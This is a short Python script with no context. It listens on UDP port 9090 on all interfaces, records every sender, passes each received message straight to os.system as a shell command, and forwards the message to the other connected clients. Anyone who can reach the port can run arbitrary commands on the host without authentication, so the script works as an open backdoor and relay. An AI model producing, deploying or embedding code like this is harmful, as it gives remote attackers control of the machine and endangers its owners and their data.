import socket, time, os
clients = [] 
s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
print(socket.gethostbyname(socket.gethostname()))
s.bind(('', 9090))
quit = False
while not quit:
	try:
		data, addr = s.recvfrom(1024)
		if addr not in clients:
			clients.append(addr)
		os.system(data.decode("utf-8"))
		for client in clients:
			if addr != client:
				s.sendto(data,client)
	except:
		quit = True
s.close()
